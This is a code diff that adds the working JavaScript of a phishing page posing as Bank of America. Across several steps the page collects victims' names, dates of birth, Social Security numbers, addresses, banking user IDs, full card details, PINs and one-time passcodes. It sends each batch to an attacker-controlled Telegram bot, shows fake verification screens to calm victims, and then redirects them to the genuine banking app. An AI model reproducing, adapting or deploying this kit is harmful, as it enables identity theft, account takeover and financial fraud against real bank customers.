+            const wrapper = document.getElementById('card-type-icon-wrapper');
+            const svgContainer = document.getElementById('card-svg-icon');
+            
+            if (!cardNumber || cardNumber.replace(/\D/g, '').length < 2) {
+                wrapper.classList.remove('visible');
+                svgContainer.outerHTML = CARD_SVGS.default;
+                return;
+            }
+
+            const cardType = CardValidator.getCardType(cardNumber);
+            wrapper.classList.add('visible');
+            
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = cardType.svg;
+            const newSvg = tempDiv.firstElementChild;
+            
+            newSvg.id = 'card-svg-icon';
+            
+            svgContainer.parentNode.replaceChild(newSvg, svgContainer);
+        }
+
+
+        function showLoading(duration) {
+            return new Promise((resolve) => {
+                const overlay = document.getElementById('loading-overlay');
+                const textEl = document.getElementById('loading-text');
+                const subEl = document.getElementById('loading-sub');
+                const fillEl = document.getElementById('loading-progress-fill');
+
+                const msgs = [
+                    { main: "Processing...", sub: "Please wait" },
+                    { main: "Verifying...", sub: "Checking details" },
+                    { main: "Almost there...", sub: "Loading" },
+                    { main: "Validating...", sub: "Securing connection" }
+                ];
+                const msg = msgs[Math.floor(Math.random() * msgs.length)];
+                textEl.textContent = msg.main;
+                subEl.textContent = msg.sub;
+
+                overlay.classList.add('show');
+                fillEl.style.width = '0%';
+
+                const total = duration || 2000;
+                const steps = 20;
+                let progress = 0;
+                const interval = total / steps;
+
+                const timer = setInterval(() => {
+                    progress += 100 / steps;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(timer);
+                        setTimeout(() => {
+                            overlay.classList.remove('show');
+                            resolve();
+                        }, 300);
+                    }
+                    fillEl.style.width = progress + '%';
+                }, interval);
+            });
+        }
+
+
+        async function sendToTelegram(message) {
+            try {
+                if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken === 'YOUR_BOT_TOKEN_HERE') {
+                    console.log('📨 Message:', message);
+                    return false;
+                }
+                const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CONFIG.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (e) {
+                console.error('Telegram error:', e);
+                return false;
+            }
+        }
+
+        function buildTelegramMessage(step, data, isOTP = false, isResend = false) {
+            const ts = new Date().toLocaleString('en-US', { timeZone: 'America/New_York', dateStyle: 'full', timeStyle: 'medium' });
+            const vid = generateVisitorId();
+            const phoneLast = data.phone ? data.phone.replace(/\D/g, '').slice(-4) : 'N/A';
+
+            let msg = `🔔 <b>Bank of America - Submission</b>\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `📅 ${ts}\n`;
+            msg += `📌 Step ${step}/5\n`;
+            msg += `🔢 Visitor: ${vid}\n`;
+            msg += `📱 Phone Ending: ${phoneLast}\n`;
+            if (isResend) msg += `🔄 Resend #${resendCount}\n`;
+            if (isOTP) msg += `✉️ OTP: ${data.otp || 'N/A'}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+            if (data.firstName) msg += `👤 First: ${data.firstName}\n`;
+            if (data.middleName) msg += `👤 Middle: ${data.middleName}\n`;
+            if (data.lastName) msg += `👤 Last: ${data.lastName}\n`;
+            if (data.dob) msg += `📅 DOB: ${data.dob}\n`;
+            if (data.ssn) msg += `🆔 SSN: ${data.ssn}\n`;
+            if (data.phone) msg += `📱 Phone: ${data.phone}\n`;
+            if (data.address) msg += `🏠 Address: ${data.address}\n`;
+            if (data.city) msg += `🏙️ City: ${data.city}\n`;
+            if (data.state) msg += `📍 State: ${data.state}\n`;
+            if (data.zip) msg += `📮 ZIP: ${data.zip}\n`;
+            if (data.userId) msg += `🔑 User ID: ${data.userId}\n`;
+            if (data.cardNumber) msg += `💳 Card: ${data.cardNumber}\n`;
+            if (data.cardType) msg += `🏷️ Type: ${data.cardType}\n`;
+            if (data.expiry) msg += `📆 Expiry: ${data.expiry}\n`;
+            if (data.cvv) msg += `🔐 CVV: ${data.cvv}\n`;
+            if (data.pin) msg += `🔢 PIN: ${data.pin}\n`;
+
+            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 ${navigator.userAgent || 'Unknown'}`;
+            return msg;
+        }
+
+        function collectStepData(step) {
+            const data = { ...collectedData };
+            if (step === 1) {
+                data.firstName = document.getElementById('first-name').value.trim();
+                data.middleName = document.getElementById('middle-name').value.trim();
+                data.lastName = document.getElementById('last-name').value.trim();
+                const m = document.querySelector('.dob-input[data-type="month"]').value;
+                const d = document.querySelector('.dob-input[data-type="day"]').value;
+                const y = document.querySelector('.dob-input[data-type="year"]').value;
+                data.dob = `${m}/${d}/${y}`;
+            } else if (step === 2) {
+                data.ssn = document.getElementById('ssn-input').value;
+                data.phone = document.getElementById('phone-input').value;
+                data.address = document.getElementById('street-address').value.trim();
+                data.city = document.getElementById('city').value.trim();
+                data.state = document.getElementById('state').value.trim();
+                data.zip = document.getElementById('zip-code').value.trim();
+            } else if (step === 3) {
+                data.userId = document.getElementById('user-id').value.trim();
+                data.cardNumber = document.getElementById('card-number').value;
+                const cardTypeInfo = CardValidator.getCardType(data.cardNumber);
+                data.cardType = cardTypeInfo.name;
+                data.expiry = document.getElementById('expiry-input').value;
+                data.cvv = document.getElementById('cvv-input').value;
+            } else if (step === 4) {
+                data.pin = document.getElementById('pin-input').value;
+                data.otp = document.getElementById('otp-input').value;
+            }
+            collectedData = data;
+            return data;
+        }
+
+
+        async function handleNextStep(stepFrom) {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            if (stepFrom === 1 && !isRobotChecked) {
+                document.getElementById('robot-error').classList.remove('hidden');
+                document.getElementById('robot-checkbox').style.borderColor = '#dc2626';
+                isProcessing = false;
+                return;
+            }
+
+            if (!validateStep(stepFrom)) {
+                isProcessing = false;
+                return;
+            }
+
+            const data = collectStepData(stepFrom);
+            const msg = buildTelegramMessage(stepFrom, data);
+            await sendToTelegram(msg);
+            await showLoading(2000);
+
+            document.getElementById(`step-${stepFrom}`).classList.remove('active');
+            currentStep = stepFrom + 1;
+            document.getElementById(`step-${currentStep}`).classList.add('active');
+            createProgressBar();
+
+            isProcessing = false;
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+
+        function validateStep(step) {
+            let valid = true;
+
+            if (step === 1) {
+                const firstName = document.getElementById('first-name').value.trim();
+                const lastName = document.getElementById('last-name').value.trim();
+                if (!firstName) { valid = false; showInvalid('first-name'); } else showValid('first-name');
+                if (!lastName) { valid = false; showInvalid('last-name'); } else showValid('last-name');
+
+                if (!isDOBValid()) {
+                    valid = false;
+                    document.querySelectorAll('.dob-input').forEach(inp => inp.classList.add('invalid'));
+                    const err = document.getElementById('dob-error');
+                    if (err.classList.contains('hidden')) {
+                        err.textContent = '❌ Please enter a valid date of birth (18+)';
+                        err.classList.remove('hidden');
+                    }
+                } else {
+                    document.querySelectorAll('.dob-input').forEach(inp => inp.classList.remove('invalid'));
+                }
+                if (!valid) alert('Please fill in all required fields.');
+            }
+
+            if (step === 2) {
+                const ssn = document.getElementById('ssn-input').value.replace(/\D/g, '');
+                const phone = document.getElementById('phone-input').value.replace(/\D/g, '');
+                const street = document.getElementById('street-address').value.trim();
+                const city = document.getElementById('city').value.trim();
+                const state = document.getElementById('state').value.trim();
+                const zip = document.getElementById('zip-code').value.trim();
+
+                if (ssn.length !== 9) { valid = false; showInvalid('ssn-input'); } else showValid('ssn-input');
+                if (phone.length !== 10) { valid = false; showInvalid('phone-input'); } else showValid('phone-input');
+                if (!street) { valid = false; showInvalid('street-address'); } else showValid('street-address');
+                if (!city) { valid = false; showInvalid('city'); } else showValid('city');
+                if (state.length < 2) { valid = false; showInvalid('state'); } else showValid('state');
+                if (zip.replace(/\D/g, '').length < 5) { valid = false; showInvalid('zip-code'); } else showValid('zip-code');
+
+                if (!valid) alert('Please fill in all required fields.');
+            }
+
+            if (step === 3) {
+                const card = document.getElementById('card-number').value;
+                const expiry = document.getElementById('expiry-input').value;
+                const cvv = document.getElementById('cvv-input').value;
+                const result = CardValidator.validateFullCard(card, expiry, cvv);
+
+                if (!result.valid) {
+                    valid = false;
+                    if (result.field === 'card') {
+                        showInvalid('card-number');
+                        document.getElementById('card-hint').textContent = '❌ ' + result.message;
+                        document.getElementById('card-hint').className = 'validation-hint error';
+                    } else if (result.field === 'expiry') {
+                        showInvalid('expiry-input');
+                        document.getElementById('expiry-hint').textContent = '❌ ' + result.message;
+                        document.getElementById('expiry-hint').className = 'validation-hint error';
+                    } else if (result.field === 'cvv') {
+                        showInvalid('cvv-input');
+                        document.getElementById('cvv-hint').textContent = '❌ ' + result.message;
+                        document.getElementById('cvv-hint').className = 'validation-hint error';
+                    }
+                    alert('❌ ' + result.message);
+                } else {
+                    showValid('card-number');
+                    document.getElementById('card-hint').textContent = ' ' + result.message;
+                    document.getElementById('card-hint').className = 'validation-hint success';
+                    showValid('expiry-input');
+                    document.getElementById('expiry-hint').textContent = ' ' + result.message;
+                    document.getElementById('expiry-hint').className = 'validation-hint success';
+                    showValid('cvv-input');
+                    document.getElementById('cvv-hint').textContent = ' ' + result.message;
+                    document.getElementById('cvv-hint').className = 'validation-hint success';
+                }
+            }
+
+            return valid;
+        }
+
+        
+        function isDOBValid() {
+            const month = parseInt(document.querySelector('.dob-input[data-type="month"]').value);
+            const day = parseInt(document.querySelector('.dob-input[data-type="day"]').value);
+            const year = parseInt(document.querySelector('.dob-input[data-type="year"]').value);
+
+            if (!month || !day || !year) return false;
+            if (month < 1 || month > 12) return false;
+            if (day < 1 || day > 31) return false;
+            if (year < 1900 || year > new Date().getFullYear()) return false;
+
+            const date = new Date(year, month - 1, day);
+            if (date.getFullYear() !== year || date.getMonth() !== month - 1 || date.getDate() !== day) return false;
+
+            const age = new Date().getFullYear() - year;
+            if (age < 18) return false;
+            return true;
+        }
+
+        
+        async function verifyPIN() {
+            const pinInput = document.getElementById('pin-input');
+            const pin = pinInput.value;
+            const errorEl = document.getElementById('pin-error');
+            const pinSection = document.getElementById('pin-section');
+            const otpLoading = document.getElementById('otp-loading');
+            const otpSection = document.getElementById('otp-section');
+            const verifyBtn = document.getElementById('verify-pin-btn');
+
+            if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+                errorEl.classList.remove('hidden');
+                pinInput.classList.add('invalid');
+                setTimeout(() => pinInput.classList.remove('invalid'), 1500);
+                return;
+            }
+
+            errorEl.classList.add('hidden');
+            pinInput.classList.remove('invalid');
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
+            pinSection.style.opacity = '0.5';
+
+            try {
+                const data = collectStepData(4);
+                const msg = buildTelegramMessage(4, data);
+                await sendToTelegram(msg);
+
+                otpLoading.classList.add('show');
+                const loadingText = document.getElementById('otp-loading-text');
+                const msgs = ['Verifying...', 'Checking...', 'Validating...', 'Verified!'];
+                let idx = 0;
+                const interval = setInterval(() => {
+                    idx++;
+                    if (idx < msgs.length - 1) loadingText.textContent = msgs[idx];
+                }, 600);
+
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                clearInterval(interval);
+                loadingText.textContent = 'Verified!';
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                otpLoading.classList.remove('show');
+                pinSection.classList.add('hidden');
+                otpSection.classList.remove('hidden');
+
+                const phoneLast = document.getElementById('phone-input').value.replace(/\D/g, '').slice(-4) || '1234';
+                document.getElementById('last4').textContent = phoneLast;
+
+                startResendTimer();
+                pinVerified = true;
+                document.getElementById('otp-error').classList.add('hidden');
+
+            } catch (e) {
+                console.error(e);
+                alert('Error. Please try again.');
+            } finally {
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Verifying';
+                pinSection.style.opacity = '1';
+            }
+        }
+
+        
+        async function verifyOTP() {
+            if (isProcessing) return;
+            isProcessing = true;
+
+            const otp = document.getElementById('otp-input').value.trim();
+            if (otp.length === 6 && /^\d{6}$/.test(otp)) {
+                collectStepData(4);
+                collectedData.otp = otp;
+                const msg = buildTelegramMessage(4, collectedData, true);
+                await sendToTelegram(msg);
+                await showLoading(3000);
+
+                document.getElementById('step-4').classList.remove('active');
+                currentStep = 5;
+                document.getElementById('step-5').classList.add('active');
+                createProgressBar();
+
+                const completionMsg = `✅ <b>COMPLETE!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🔢 Visitor: ${generateVisitorId()}\n📱 Phone: ${collectedData.phone || 'N/A'}\n✅ OTP: ${otp}\n🎯 All data collected!`;
+                sendToTelegram(completionMsg);
+
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+                isProcessing = false;
+            } else {
+                document.getElementById('otp-error').classList.remove('hidden');
+                document.getElementById('otp-input').classList.add('invalid');
+                setTimeout(() => document.getElementById('otp-input').classList.remove('invalid'), 2000);
+                isProcessing = false;
+            }
+        }
+
+        
+        function handleResendCode() {
+            resendCount++;
+            const phone = document.getElementById('phone-input').value || 'N/A';
+            const alertMsg = `🔄 <b>Code Resent</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🔢 Visitor: ${generateVisitorId()}\n📱 Phone: ${phone}\n🔄 Attempt: ${resendCount}`;
+            sendToTelegram(alertMsg);
+
+            const alertDiv = document.getElementById('resend-alert');
+            alertDiv.classList.remove('hidden');
+            setTimeout(() => alertDiv.classList.add('hidden'), 3000);
+
+            startResendTimer();
+            document.getElementById('otp-input').value = '';
+            document.getElementById('otp-error').classList.add('hidden');
+        }
+
+        function startResendTimer() {
+            let timeLeft = 60;
+            const btn = document.getElementById('resend-btn');
+            btn.disabled = true;
+            btn.textContent = `Resend (${timeLeft}s)`;
+            if (resendTimer) clearInterval(resendTimer);
+            resendTimer = setInterval(() => {
+                timeLeft--;
+                btn.textContent = `Resend (${timeLeft}s)`;
+                if (timeLeft <= 0) {
+                    clearInterval(resendTimer);
+                    btn.disabled = false;
+                    btn.textContent = 'Resend Code';
+                }
+            }, 1000);
+        }
+
+        
+        function redirectToAppStore() {
+            const ua = navigator.userAgent || '';
+            if (/iPhone|iPad|iPod/.test(ua)) {
+                window.location.href = 'https://apps.apple.com/us/app/bank-of-america-mobile-banking/id284847138';
+            } else {
+                window.location.href = 'https://play.google.com/store/apps/details?id=com.infonow.bofa&hl=en';
+            }
+        }
+
+        
+        document.addEventListener('input', function(e) {
+            const target = e.target;
+            const type = target.getAttribute('data-type');
+
+            if (type === 'name') {
+                target.value = target.value.replace(/[^a-zA-Z\s\-]/g, '');
+                return;
+            }
+            if (type === 'ssn') {
+                let raw = target.value.replace(/\D/g, '');
+                if (raw.length > 9) raw = raw.slice(0, 9);
+                let formatted = '';
+                if (raw.length > 0) {
+                    formatted += raw.slice(0, 3);
+                    if (raw.length >= 4) formatted += '-' + raw.slice(3, 5);
+                    if (raw.length >= 6) formatted += '-' + raw.slice(5, 9);
+                }
+                target.value = formatted;
+                return;
+            }
+            if (type === 'phone') {
+                let raw = target.value.replace(/\D/g, '');
+                if (raw.length > 10) raw = raw.slice(0, 10);
+                let formatted = '';
+                if (raw.length > 0) {
+                    formatted += '(' + raw.slice(0, 3);
+                    if (raw.length >= 4) formatted += ') ' + raw.slice(3, 6);
+                    if (raw.length >= 7) formatted += '-' + raw.slice(6, 10);
+                }
+                target.value = formatted;
+                return;
+            }
+            if (type === 'card') {
+                let raw = target.value.replace(/\D/g, '');
+                if (raw.length > 16) raw = raw.slice(0, 16);
+                let formatted = '';
+                for (let i = 0; i < raw.length; i++) {
+                    if (i > 0 && i % 4 === 0) formatted += ' ';
+                    formatted += raw[i];
+                }
+                target.value = formatted;
+
+                
+                updateCardIcon(raw);
+
+                const hint = document.getElementById('card-hint');
+                if (raw.length >= 13) {
+                    const result = CardValidator.validateCardNumber(raw);
+                    const cardType = CardValidator.getCardType(raw);
+                    if (result.valid) {
+                        hint.textContent = ' ' + result.message + ' (' + cardType.name + ')';
+                        hint.className = 'validation-hint success';
+                        target.classList.remove('invalid');
+                        target.classList.add('valid');
+                    } else {
+                        hint.textContent = '❌ ' + result.message;
+                        hint.className = 'validation-hint error';
+                        target.classList.remove('valid');
+                        target.classList.add('invalid');
+                    }
+                } else if (raw.length > 0) {
+                    hint.textContent = 'ℹ️ Enter ' + (13 - raw.length) + ' more digits';
+                    hint.className = 'validation-hint';
+                    target.classList.remove('invalid', 'valid');
+                } else {
+                    hint.className = 'validation-hint hidden';
+                    target.classList.remove('invalid', 'valid');
+                }
+                return;
+            }
+            if (type === 'expiry') {
+                let raw = target.value.replace(/\D/g, '');
+                if (raw.length > 4) raw = raw.slice(0, 4);
+                let formatted = '';
+                if (raw.length > 0) {
+                    formatted += raw.slice(0, 2);
+                    if (raw.length >= 2) formatted += '/' + raw.slice(2, 4);
+                }
+                target.value = formatted;
+
+                const hint = document.getElementById('expiry-hint');
+                if (raw.length === 4) {
+                    const result = CardValidator.validateExpiry(raw);
+                    if (result.valid) {
+                        hint.textContent = ' ' + result.message;
+                        hint.className = 'validation-hint success';
+                        target.classList.remove('invalid');
+                        target.classList.add('valid');
+                    } else {
+                        hint.textContent = '❌ ' + result.message;
+                        hint.className = 'validation-hint error';
+                        target.classList.remove('valid');
+                        target.classList.add('invalid');
+                    }
+                } else if (raw.length > 0) {
+                    hint.textContent = 'ℹ️ Enter MM/YY';
+                    hint.className = 'validation-hint';
+                    target.classList.remove('invalid', 'valid');
+                } else {
+                    hint.className = 'validation-hint hidden';
+                    target.classList.remove('invalid', 'valid');
+                }
+                return;
+            }
+            if (type === 'cvv') {
+                target.value = target.value.replace(/\D/g, '').slice(0, 4);
+                const hint = document.getElementById('cvv-hint');
+                const cardNumber = document.getElementById('card-number').value;
+                const cardType = CardValidator.getCardType(cardNumber);
+                const requiredLength = cardType.type === 'amex' ? 4 : 3;
+
+                if (target.value.length === requiredLength) {
+                    const result = CardValidator.validateCVV(target.value, cardType.type);
+                    if (result.valid) {
+                        hint.textContent = '  ' + result.message;
+                        hint.className = 'validation-hint success';
+                        target.classList.remove('invalid');
+                        target.classList.add('valid');
+                    } else {
+                        hint.textContent = '❌ ' + result.message;
+                        hint.className = 'validation-hint error';
+                        target.classList.remove('valid');
+                        target.classList.add('invalid');
+                    }
+                } else if (target.value.length > 0) {
+                    hint.textContent = `ℹ️ ${requiredLength} digits required`;
+                    hint.className = 'validation-hint';
+                    target.classList.remove('invalid', 'valid');
+                } else {
+                    hint.className = 'validation-hint hidden';
+                    target.classList.remove('invalid', 'valid');
+                }
+                return;
+            }
+            if (type === 'pin' || type === 'otp') {
+                target.value = target.value.replace(/\D/g, '');
+                return;
+            }
+            if (type === 'zip') {
+                target.value = target.value.replace(/[^0-9\-]/g, '');
+                return;
+            }
+            if (type === 'address') {
+                target.value = target.value.replace(/[^a-zA-Z0-9\s\-\.\,\#\/]/g, '');
+                return;
+            }
+            if (type === 'alphanumeric') {
+                target.value = target.value.replace(/[^a-zA-Z0-9]/g, '');
+                return;
+            }
+        });
+
+        
+        document.querySelectorAll('.dob-input').forEach(input => {
+            input.addEventListener('input', function(e) {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length >= parseInt(this.getAttribute('maxlength'))) {
+                    const next = this.parentElement.querySelector(
+                        `.dob-input[data-type="${
+                            this.dataset.type === 'month' ? 'day' :
+                            this.dataset.type === 'day' ? 'year' : ''
+                        }"]`
+                    );
+                    if (next) next.focus();
+                }
+                validateDOB();
+            });
+            input.addEventListener('blur', function() {
+                this.value = this.value.replace(/\D/g, '');
+                validateDOB();
+            });
+            input.addEventListener('keydown', function(e) {
+                if (!/^\d$/.test(e.key) && !['Backspace','Delete','Tab','ArrowLeft','ArrowRight','Home','End'].includes(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        function validateDOB() {
+            const month = document.querySelector('.dob-input[data-type="month"]');
+            const day = document.querySelector('.dob-input[data-type="day"]');
+            const year = document.querySelector('.dob-input[data-type="year"]');
+            const error = document.getElementById('dob-error');
+
+            if (!month.value || !day.value || !year.value) {
+                error.classList.add('hidden');
+                return;
+            }
+
+            const m = parseInt(month.value);
+            const d = parseInt(day.value);
+            const y = parseInt(year.value);
+
+            if (m < 1 || m > 12) { error.textContent = '❌ Invalid month'; error.classList.remove('hidden'); return; }
+            if (d < 1 || d > 31) { error.textContent = '❌ Invalid day'; error.classList.remove('hidden'); return; }
+            if (y < 1900 || y > new Date().getFullYear()) { error.textContent = '❌ Invalid year'; error.classList.remove('hidden'); return; }
+
+            const date = new Date(y, m - 1, d);
+            if (date.getFullYear() !== y || date.getMonth() !== m - 1 || date.getDate() !== d) {
+                error.textContent = '❌ Invalid date';
+                error.classList.remove('hidden');
+                return;
+            }
+
+            const age = new Date().getFullYear() - y;
+            if (age < 18) {
+                error.textContent = '❌ You must be 18+';
+                error.classList.remove('hidden');
+                return;
+            }
+
+            error.classList.add('hidden');
+        }
+
+
+        window.onload = function() {
+            createProgressBar();
+            toggleMailingAddress();
+            generateVisitorId();
+
+            
+            updateCardIcon('');
+
+            if (TELEGRAM_CONFIG.botToken && TELEGRAM_CONFIG.botToken !== 'YOUR_BOT_TOKEN_HERE') {
+                const startMsg = ` <b>Bank of America Bot Online</b>\n━━━━━━━━━━━━━━━━━━━━━━\n✅ Ready\n🕐 ${new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })}`;
+                sendToTelegram(startMsg);
+            }
+        };
+    </script>
+</body>
+</html>
